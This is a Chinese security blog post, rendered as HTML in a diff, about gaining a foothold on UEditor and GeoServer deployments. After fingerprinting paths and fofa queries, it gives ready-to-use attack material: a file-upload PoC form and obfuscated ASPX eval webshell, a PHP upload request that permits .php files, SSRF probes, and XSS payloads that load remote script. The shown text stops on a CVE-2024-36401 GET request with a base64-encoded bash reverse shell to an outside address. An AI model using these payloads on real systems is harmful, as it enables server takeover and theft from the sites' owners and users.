@@ -1,0 +1,848 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/09/05/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART4/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>常规外网打点-PART4</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">常规外网打点-PART4</h1><div class="meta"><span class="item" title="创建时间：2026-09-05 22:20:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-09-05T22:20:00+08:00">2026-09-05</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>21k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>19 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/09/05/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART4/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="常规外网打点-part4持续更新中"><a class="anchor" href="#常规外网打点-part4持续更新中">#</a> 常规外网打点-PART4（持续更新中......）</h1>
+<p>本节我们学习编辑器类和其他东西的利用</p>
+<h2 id="ueditor"><a class="anchor" href="#ueditor">#</a> UEditor</h2>
+<p>UEditor是由百度Web前端研发部开发的所见即所得的开源富文本编辑器，具有轻量、可定制、用户体验优秀等特点，基于MIT开源协议，所有源代码在协议允许范围内可自由修改与使用</p>
+<h3 id="指纹特征"><a class="anchor" href="#指纹特征">#</a> 指纹特征</h3>
+<ul>
+<li>
+<p><strong>默认路径与文件结构指纹</strong>：UEditor部署之后通常会保留其默认的目录名称和核心静态文件，常能发现以下路径：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 核心配置与脚本文件</span></span>
+<span class="line"><span>/ueditor/ueditor.config.js</span></span>
+<span class="line"><span>/ueditor/ueditor.all.js</span></span>
+<span class="line"><span>/ueditor/ueditor.all.min.js</span></span>
+<span class="line"><span>/ueditor/lang/zh-cn/zh-cn.js</span></span>
+<span class="line"><span># 默认测试/演示页面</span></span>
+<span class="line"><span>/ueditor/index.html</span></span>
+<span class="line"><span># 对话框与UI组件目录</span></span>
+<span class="line"><span>/ueditor/dialogs</span></span>
+<span class="line"><span>/ueditor/themes/default/css/ueditor.css</span></span></code></pre>
+</li>
+<li>
+<p><strong>后端控制器路径指纹</strong>：UEditor的文件上传、远程抓图等功能依赖于后端的处理脚本，不同语言版本的UEditor对应不同的后端控制器路径：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># PHP</span></span>
+<span class="line"><span>/ueditor/php/controller.php</span></span>
+<span class="line"><span># JSP</span></span>
+<span class="line"><span>/ueditor/jsp/controller.jsp</span></span>
+<span class="line"><span># ASP.NET(C#)</span></span>
+<span class="line"><span>/ueditor/net/controller.ashx</span></span>
+<span class="line"><span># ASP</span></span>
+<span class="line"><span>/ueditor/asp/controller.asp</span></span></code></pre>
+</li>
+<li>
+<p><strong>API动态交互与参数特征</strong>：无论后端是什么语言，UEditor的前后端交互都遵循一套固定的API规范，通过向Controller发送特定的<code>action</code>参数，可以精准确认UEditor的存在及配置：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 探测请求</span></span>
+<span class="line"><span>GET /ueditor/jsp/controller.jsp?action=config</span></span>
+<span class="line"><span># 响应指纹</span></span>
+<span class="line"><span>&#123;</span></span>
+<span class="line"><span>    "imageActionName": "uploadimage",</span></span>
+<span class="line"><span>    "imageFieldName": "upfile",</span></span>
+<span class="line"><span>    "imageMaxSize": 2048000,</span></span>
+<span class="line"><span>    "imageAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp"],</span></span>
+<span class="line"><span>    "catcherLocalDomain": ["127.0.0.1", "localhost", "img.baidu.com"]</span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+</li>
+<li>
+<p><strong>前端DOM与代码特征</strong>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># JavaScript变量与对象</span></span>
+<span class="line"><span>页面源码通常存在windw.UEDITOR_HOME_URL的定义</span></span>
+<span class="line"><span>实例化编辑器的代码通常为UE.getEditor('editor_id')</span></span>
+<span class="line"><span># HTML类名与CSS特征</span></span>
+<span class="line"><span>编辑器加载后，其生成的HTML容器通常带有edui-default、edui-editor、edui-editor-toolbarbox等标志性的CSS class</span></span>
+<span class="line"><span>编辑区域通常是一个iframe，其ID类似edui1_iframe或以edui开头</span></span></code></pre>
+</li>
+<li>
+<p><strong>fofa语法</strong>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>body="ueditor.config.js"</span></span>
+<span class="line"><span>body="UE.getEitor"</span></span>
+<span class="line"><span>body="edui-default"</span></span></code></pre>
+</li>
+</ul>
+<h3 id="net版本任意文件上传"><a class="anchor" href="#net版本任意文件上传">#</a> .NET版本任意文件上传</h3>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq2539879928/article/details/127811506">UEditor v1.4.3.3 .net版本任意文件上传 漏洞复现_ueditor漏洞复现-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39101049/article/details/97684968">UEditor安全风险：文件上传与SSRF漏洞详解-CSDN博客</a></p>
+<p>影响范围为UEditor v1.4.3.3</p>
+<p>如果访问<code>/Content/ueditor/net/controller.ashx?action=catchimage</code>页面提示“参数错误：没有指定抓取源”时，则说明存在该漏洞</p>
+<p>在<code>CrawlerHandler.cs</code>文件中，后端获取远程资源时，仅校验了HTTP响应头中的<code>ContentType</code>是否包含<code>image</code>，而没有严格检查文件的实际后缀与内容，那么攻击者可以通过构造包含木马的URL诱导服务器抓取，因为保存文件的后缀过滤不严，最终会导致恶意的<code>.aspx</code>脚本被写入服务器目录，从而直接获取服务器的控制权限</p>
+<p>需要在本地创建一个<code>poc.html</code>文件（记得修改action为目标漏洞路径）：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>&#x3C;form action=" http://xxx.com/Content/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST"></span></span>
+<span class="line"><span>  &#x3C;p>shell addr:&#x3C;input type="text" name="source[]" />&#x3C;/p ></span></span>
+<span class="line"><span>  &#x3C;input type="submit" value="Submit" /></span></span>
+<span class="line"><span>&#x3C;/form></span></span></code></pre>
+<p>然后制作一个aspx图片马：<code>1.gif?.aspx</code>（一句话木马，密码为hello）</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GIF89a</span></span>
+<span class="line"><span>&#x3C;script runat="server" language="JScript"></span></span>
+<span class="line"><span>   function popup(str) &#123;</span></span>
+<span class="line"><span>       var q = "u";</span></span>
+<span class="line"><span>       var w = "afe";</span></span>
+<span class="line"><span>       var a = q + "ns" + w; var b= eval(str,a); return(b);</span></span>
+<span class="line"><span>  &#125;</span></span>
+<span class="line"><span>&#x3C;/script></span></span>
+<span class="line"><span>&#x3C;% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJoZWxsbyJd")))); %></span></span></code></pre>
+<p>打开poc.html之后，输入VPS的图片马地址，成功上传至目标服务器之后会返回webshell访问地址，之后使用webshell管理工具连接指定地址即可</p>
+<p><strong>php版本的文件上传</strong>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&#x26;CONFIG[imagePathFormat]=ueditor/php/upload/fuck&#x26;CONFIG[imageMaxSize]=9999999&#x26;CONFIG[imageAllowFiles][]=.php&#x26;CONFIG[imageFieldName]=fuck HTTP/1.1</span></span>
+<span class="line"><span>Host: localhost</span></span>
+<span class="line"><span>Connection: keep-alive</span></span>
+<span class="line"><span>Content-Length: 222</span></span>
+<span class="line"><span>Cache-Control: max-age=0</span></span>
+<span class="line"><span>Origin: null</span></span>
+<span class="line"><span>Upgrade-Insecure-Requests: 1</span></span>
+<span class="line"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36</span></span>
+<span class="line"><span>Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxA</span></span>
+<span class="line"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4</span></span>
+<span class="line"><span>———WebKitFormBoundaryDMmqvK6b3ncX4xxA</span></span>
+<span class="line"><span>Content-Disposition: form-data; name="fuck"; filename="fuck.php"</span></span>
+<span class="line"><span>Content-Type: application/octet-stream</span></span>
+<span class="line"><span>&#x3C;?php </span></span>
+<span class="line"><span>phpinfo();</span></span>
+<span class="line"><span>?></span></span>
+<span class="line"><span>———WebKitFormBoundaryDMmqvK6b3ncX4xxA—</span></span></code></pre>
+<p>shell路径由<code>CONFIG[imagePathFormat]=ueditor/php/upload/fuck</code>决定</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://localhost/ueditor/php/upload/fuck.php</span></span></code></pre>
+<h3 id="ssrf"><a class="anchor" href="#ssrf">#</a> SSRF</h3>
+<p>该漏洞存在于1.4.3的JSP版本中</p>
+<p>触发点为<code>controller.jsp?action=catchimage</code>或<code>controller.php?action=catchimage</code>，当通过<code>source[]</code>参数传入外部URL时，后端未对目标IP进行严格的内网私有IP限制，所以攻击者可以传入内网的IP和端口，利用UEditor所在的服务器作为跳板对内网其他机器进行端口扫描或信息探测</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>/ueditor/jsp/controller.jsp?action=catchimage&#x26;source[]=https://www.baidu.com/img/baidu_jgylogo3.gif</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>/ueditor/php/controller.php?action=catchimage&#x26;source[]=https://www.baidu.com/img/baidu_jgylogo3.gif</span></span></code></pre>
+<p>这里可以根据页面返回的结果不同，来判断改地址对应的主机端口是否开放，可以总结为：</p>
+<ul>
+<li>如果住区不存在的图片地址时，页面返<code>&#123;“state”: “SUCCESS”, list: [&#123;“state”:&quot;\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519&quot;&#125; ]&#125;</code>，即state为“远程连接出错”</li>
+<li>如果成功抓取到图片，页面返回<code>&#123;“state”: “SUCCESS”, list: [&#123;“state”: “SUCCESS”,“size”:“5103”,“source”:“http://192.168.135.133:8080/tomcat.png”,“title”:“1527173588127099881.png”,“url”:&quot;/ueditor/jsp/upload/image/20180524/1527173588127099881.png&quot;&#125; ]&#125;</code>，即state为“SUCCESS”</li>
+<li>如果主机无法访问，页面返回<code>&#123;“state”:“SUCCESS”, list: [&#123;“state”: “\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25”&#125;]&#125;</code>，即state为&quot;抓取远程图片失败&quot;</li>
+</ul>
+<p>还有一个存在于onethink 1.0版本的ueditor，测试版本为1.2：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span> POST http://target/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1</span></span>
+<span class="line"><span>    Host: target</span></span>
+<span class="line"><span>    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0</span></span>
+<span class="line"><span>    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
+<span class="line"><span>    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
+<span class="line"><span>    Accept-Encoding: gzip, deflate</span></span>
+<span class="line"><span>    Content-Type: application/x-www-form-urlencoded</span></span>
+<span class="line"><span>    Content-Length: 37</span></span>
+<span class="line"><span>    Connection: keep-alive</span></span>
+<span class="line"><span>    </span></span>
+<span class="line"><span>    upfile=https://www.google.com/?%23.jpg</span></span></code></pre>
+<h3 id="文件上传导致存储型xss"><a class="anchor" href="#文件上传导致存储型xss">#</a> 文件上传导致存储型XSS</h3>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/124803185">Ueditor的XML文件上传导致存储型XSS(可以再试试xxe)和ssrf漏洞_xml ssrf-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://idocdown.com/app/articles/blogs/detail/2048#google_vignette">Ueditor编辑器漏洞总结</a></p>
+<p>该漏洞属于UEditor的文件上传导致存储型XSS，攻击者可以通过上传图片文件然后抓包拦截，将<code>uploadimage</code>类型修改为<code>uploadfile</code>，并修改文件后缀名为<code>xml</code></p>
+<p>常用的XSS Payload：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 弹窗XSS</span></span>
+<span class="line"><span>&#x3C;html></span></span>
+<span class="line"><span>&#x3C;head>&#x3C;/head></span></span>
+<span class="line"><span>&#x3C;body></span></span>
+<span class="line"><span>&#x3C;something:script xmlns:something="http://www.w3.org/1999/xhtml"> alert(1);</span></span>
+<span class="line"><span>&#x3C;/something:script></span></span>
+<span class="line"><span>&#x3C;/body></span></span>
+<span class="line"><span>&#x3C;/html></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># URL跳转</span></span>
+<span class="line"><span>&#x3C;html></span></span>
+<span class="line"><span>&#x3C;head>&#x3C;/head></span></span>
+<span class="line"><span>&#x3C;body></span></span>
+<span class="line"><span>&#x3C;something:script xmlns:something="http://www.w3.org/1999/xhtml"> window.location.href="https://www.t00ls.net/";</span></span>
+<span class="line"><span>&#x3C;/something:script></span></span>
+<span class="line"><span>&#x3C;/body></span></span>
+<span class="line"><span>&#x3C;/html></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 远程加载JS</span></span>
+<span class="line"><span>&#x3C;html></span></span>
+<span class="line"><span>&#x3C;head>&#x3C;/head></span></span>
+<span class="line"><span>&#x3C;body></span></span>
+<span class="line"><span>&#x3C;something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml"></span></span>
+<span class="line"><span>&#x3C;/something:script></span></span>
+<span class="line"><span>&#x3C;/body></span></span>
+<span class="line"><span>&#x3C;/html></span></span></code></pre>
+<p>常用的文件上传路径有：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/ueditor/index.html</span></span>
+<span class="line"><span>/ueditor/asp/controller.asp?action=uploadimage</span></span>
+<span class="line"><span>/ueditor/asp/controller.asp?action=uploadfile</span></span>
+<span class="line"><span>/ueditor/net/controller.ashx?action=uploadimage</span></span>
+<span class="line"><span>/ueditor/net/controller.ashx?action=uploadfile</span></span>
+<span class="line"><span>/ueditor/php/controller.php?action=uploadfile</span></span>
+<span class="line"><span>/ueditor/php/controller.php?action=uploadimage</span></span>
+<span class="line"><span>/ueditor/jsp/controller.jsp?action=uploadfile</span></span>
+<span class="line"><span>/ueditor/jsp/controller.jsp?action=uploadimage</span></span></code></pre>
+<p>常用列出获取路径为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/ueditor/net/controller.ashx?action=listfile</span></span>
+<span class="line"><span>/ueditor/net/controller.ashx?action=listimage</span></span></code></pre>
+<h2 id="geoserver"><a class="anchor" href="#geoserver">#</a> GeoServer</h2>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/priv/p/19297085">GeoServer地理服务器特征及漏洞复现 - shinianyunyan - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2921958.html">Geoserver最全历史漏洞详解 | CN-SEC 中文网</a></p>
+<p>GeoServer是一个开源的地图服务器，基于OpenGIS Web服务器规范的J2EE实现，它允许用户方便地发布地图数据，并对特征数据进行更新、删除、插入操作。通过GeoServer，用户可以迅速共享空间地理信息。其主要功能包括<strong>发布地图数据</strong>，<strong>支持多种服务</strong>（Web Map Service、Web Feature Service、Web Map Tile Service），<strong>数据管理</strong>，<strong>兼容性</strong></p>
+<h3 id="指纹特征-2"><a class="anchor" href="#指纹特征-2">#</a> 指纹特征</h3>
+<ul>
+<li>
+<p>默认Web管理入口通常是<code>http://[IP]/geoserver</code></p>
+</li>
+<li>
+<p>页面标题或者正文经常包含：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GeoServer</span></span>
+<span class="line"><span>Welcome to GeoServer</span></span>
+<span class="line"><span>GeoServer Web Administration</span></span></code></pre>
+</li>
+<li>
+<p>GeoServer最典型的OGC接口：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/geoserver/wms</span></span>
+<span class="line"><span>/geoserver/wfs</span></span>
+<span class="line"><span>/geoserver/wcs</span></span></code></pre>
+</li>
+<li>
+<p>WFS指纹：<code>/geoserver/wfs?service=WFS&amp;request=GetCapabilities</code>，其常见内容包括<code>GeoServer Web Feature Service</code></p>
+</li>
+<li>
+<p>WCS指纹：<code>/geoserver/wcs?service=WCS&amp;request=GetCapabilities</code></p>
+</li>
+<li>
+<p>此外，GeoServer经常暴露一些较有辨识度的路径：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/geoserver/web/</span></span>
+<span class="line"><span>/geoserver/wms</span></span>
+<span class="line"><span>/geoserver/wfs</span></span>
+<span class="line"><span>/geoserver/wcs</span></span>
+<span class="line"><span>/geoserver/ows</span></span>
+<span class="line"><span>/geoserver/rest/</span></span>
+<span class="line"><span>/geoserver/gwc/</span></span>
+<span class="line"><span>/geoserver/gwc/service/wmts</span></span></code></pre>
+</li>
+<li>
+<p>Geoserver Web管理界面基于Apache Wicket，因此页面源码中可能看到类似：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>org.apache.wicket</span></span>
+<span class="line"><span>wicket</span></span>
+<span class="line"><span>wicket:id</span></span></code></pre>
+</li>
+<li>
+<p>静态资源URL也可能带有wicket风格路径，例如<code>/geoserver/web/wicket/resource/...</code></p>
+</li>
+<li>
+<p><strong>错误信息指纹</strong>：<code>Could not determine geoserver request from http request</code></p>
+</li>
+<li>
+<p><strong>REST API</strong>：常见接口<code>/geoserver/rest/</code>，例如：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/geoserver/rest/workspaces</span></span>
+<span class="line"><span>/geoserver/rest/layers</span></span>
+<span class="line"><span>/geoserver/rest/styles</span></span></code></pre>
+</li>
+<li>
+<p><strong>GeoWebCache指纹</strong>：GeoServer通常自带GeoWebCache，可以检查：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/geoserver/gwc/</span></span>
+<span class="line"><span>/geoserver/gwc/service/wmts</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># WMTS capabilities</span></span>
+<span class="line"><span>/geoserver/gwc/service/wmts?REQUEST=GetCapabilities</span></span></code></pre>
+<p>可能看到：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GeoWebCache</span></span>
+<span class="line"><span>WMTS</span></span></code></pre>
+</li>
+</ul>
+<h3 id="弱口令"><a class="anchor" href="#弱口令">#</a> 弱口令</h3>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>admin/geoserver</span></span>
+<span class="line"><span>geoserver/geoserver</span></span></code></pre>
+<h3 id="属性名表达式前台rce-cve-2024-36401"><a class="anchor" href="#属性名表达式前台rce-cve-2024-36401">#</a> 属性名表达式前台RCE CVE-2024-36401</h3>
+<p>影响范围为：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GeoServer &#x3C; 2.23.6</span></span>
+<span class="line"><span>2.24.0 ≤ GeoServer &#x3C; 2.24.4</span></span>
+<span class="line"><span>2.25.0 ≤ GeoServer &#x3C; 2.25.2</span></span>
+<span class="line"><span>GeoTools &#x3C; 29.6</span></span>
+<span class="line"><span>30.0 ≤ GeoTools &#x3C; 30.4</span></span>
+<span class="line"><span>31.0 ≤ GeoTools &#x3C; 31.2</span></span></code></pre>
+<p>在GeoServer中，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用Apache Commons Jxpath提供的功能执行任意代码</p>
+<p>该漏洞存在一个前提，目标的typeNames必须存在，可以在web页面<code>/geoserver/web/wicked/bookmarkable/org.geoserver.web.demo.MapPreview?3&amp;filter=false</code>中找到当前服务器中所有Types，使用FetPropertyValue来执行XPath表达式</p>
+<p><strong>基于GET方法的poc</strong>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>GET /geoserver/wfs?service=WFS&#x26;version=2.0.0&#x26;request=GetPropertyValue&#x26;typeNames=sf:archsites&#x26;valueReference=exec(java.lang.Runtime.getRuntime(),'bash%20-c%20&#123;echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEyMC4xNDIvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;') HTTP/1.1</span></span>
+<span class="line"><span>Host: 192.168.120.133:8080</span></span>
+<span class="line"><span>Accept-Encoding: gzip, deflate, br</span></span>
+<span class="line"><span>Accept: */*</span></span>
